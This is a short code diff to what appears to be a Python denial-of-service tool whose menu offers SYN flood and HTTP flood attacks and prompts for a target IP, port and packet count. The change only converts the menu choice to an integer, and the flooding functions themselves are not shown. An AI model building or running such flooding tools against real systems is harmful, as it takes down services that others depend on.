@@ -73,15 +73,15 @@ def main():
     print("      [Menu]      ")
     print("1) SYN Flood")
     print("2) HTTP Flood")
-    option = input("Choose an option: ")
+    option = int(input("Choose an option: "))
     print(option)
-    if option == "1":
+    if option == 1:
         os.system("clear")
         dstIP = str(input("Target IP: "))
         dstPort = int(input("Target Port: "))
         counter = int(input("Packets to send: "))
         SYN_Flood(dstIP,dstPort,int(counter))
-    elif option == "2":
+    elif option == 2:
         os.system("clear")
         target = str(input("Insert Target: "))
         port = int(input("Insert Port: "))
